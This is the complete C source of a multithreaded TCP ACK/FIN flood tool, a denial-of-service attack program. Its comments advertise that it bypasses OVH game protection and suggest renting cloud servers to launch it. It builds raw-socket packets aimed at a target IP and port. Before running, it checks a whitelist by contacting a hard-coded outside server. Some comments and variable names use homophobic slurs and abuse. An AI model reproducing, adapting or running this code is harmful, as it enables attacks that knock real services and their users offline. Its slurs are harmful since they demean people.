/*
made by googleadmin

gcc -o oackv1 oackv1.c -pthread

This script does not need ip spoofing and works on OVHGAME,
you can buy servers on clouds like: digitalocean,vultr,linode..


Rememeber remove whitelist function If you dont want to use it "whitelistcheck();" on line 310
 */
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}

unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1;
    } else {
        low_num = max_num + 1;
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

unsigned short csum (unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int psize) {

    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_TCP;
    pseudohead.length=htons(sizeof(struct tcphdr) + psize);
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + psize;
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr) + psize);
    unsigned short output = csum(tcp,totaltcp_len);
    free(tcp);
    return output;
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = 6;
	iph->check = 0;
}

void setup_tcp_header(struct tcphdr *tcph)
{
	tcph->source = rand();
	tcph->seq = rand();
	tcph->ack_seq = rand();
	tcph->res2 = 0;
	tcph->ack = 1;
	tcph->fin = 0;
	tcph->doff = 5;
	tcph->window = rand();
	tcph->check = 0;
	tcph->urg_ptr = 0;
}

void setup_fin_header(struct tcphdr *tcph)
{
	tcph->source = rand();
	tcph->seq = rand();
	tcph->ack_seq = rand();
	tcph->res2 = 0;
	tcph->ack = 1;
	tcph->fin = 1;
	tcph->doff = 5;
	tcph->window = rand();
	tcph->check = 0;
	tcph->urg_ptr = 0;
}

int socket_connect(char *host, in_port_t port, int sport) {
    struct hostent *hp;
    struct sockaddr_in addr,cliaddr;
    int on = 1, sock;     
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    cliaddr.sin_family = AF_INET;
    cliaddr.sin_addr.s_addr= htonl(INADDR_ANY);
    cliaddr.sin_port=htons(sport);
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    bind(sock,(struct sockaddr *)&cliaddr,sizeof(cliaddr));
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
}
void *flood(void *par1)
{
	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
	int sportne = randnum(55000,64932);
	sportne = randnum(55000,64932);
	
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(td);
	
	int fd = 0;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    int errno = 0;
    if((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);

	tcph->dest = htons(floodport);

	iph->saddr = inet_addr(inet_ntoa(addr.sin_addr));
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}
	int gayassfuck = randnum(725,1000);
	unsigned char payload1[gayassfuck];
	int mb;
	for(mb = 0; mb <= gayassfuck; mb++){
                payload1[mb] = 88;
        }
    int sumup = sizeof(struct tcphdr) + sizeof(struct iphdr);
    memcpy((void *)tcph + sizeof(struct tcphdr) + sizeof(struct iphdr), payload1, gayassfuck);
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + gayassfuck;

    socket_connect(td, floodport, sportne);
	init_rand(time(NULL));
    register unsigned int i;
    register unsigned int packetcounter = 0;
    i = 0;
	while(1){
		if(packetcounter > 1000){
			setup_fin_header(tcph);
			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
			iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
			tcph->seq = rand_cmwc() & 0xFFFF;
			tcph->ack_seq = rand_cmwc() & 0xFFFF;
			tcph->source = htons(rand_cmwc() & 0xFFFF);
			tcph->source = htons(sportne);
			tcph->check = tcpcsum(iph, tcph, 0);
			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
			setup_tcp_header(tcph);
			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + gayassfuck;
    		sportne = randnum(45000,64932);
    		socket_connect(td, floodport, sportne);
    		sleep(1);
    		packetcounter = 0;
    	} else {
    		packetcounter += 1;
    	}
		tcph->check = 0;
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		tcph->seq = rand_cmwc() & 0xFFFF;
		tcph->ack_seq = rand_cmwc() & 0xFFFF;
		tcph->source = htons(sportne);
		tcph->check = tcpcsum(iph, tcph, gayassfuck);
		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
		
		pps++;
			i = 0;
			usleep(1900);
	}
}
int whitelistcheck()
{
	printf("Checking whitelist...\n");
    int portno     = 787;
    char *hostname = "168.138.141.224";

    int sockfd;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        error("ERROR opening socket");
    }

    server = gethostbyname(hostname);

    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host\n");
        exit(0);
    }

    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, 
         (char *)&serv_addr.sin_addr.s_addr,
         server->h_length);

    serv_addr.sin_port = htons(portno);
    if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) {
        printf("go fuck yourself bastard\n");
        exit(0);
    } else {
        printf("Success!\n");
    }

    close(sockfd);
}
int main(int argc, char *argv[ ])
{
	if(argc < 6){
		fprintf(stderr, "error\n");
		exit(-1);
	}
	whitelistcheck();

	fprintf(stdout, "preparing flood...\n");

	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	
	int multiplier = 20;

	int i;
	for(i = 0;i<num_threads;i++){
		pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
	}
	fprintf(stdout, "flooding now...\n");
	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
	{
		usleep((1000/multiplier)*1000);
		if((pps*multiplier) > maxpps)
		{
			if(1 > limiter)
			{
				sleeptime+=100;
			} else {
				limiter--;
			}
		} else {
			limiter++;
			if(sleeptime > 25)
			{
				sleeptime-=25;
			} else {
				sleeptime = 0;
			}
		}
		pps = 0;
	}

	return 0;
}
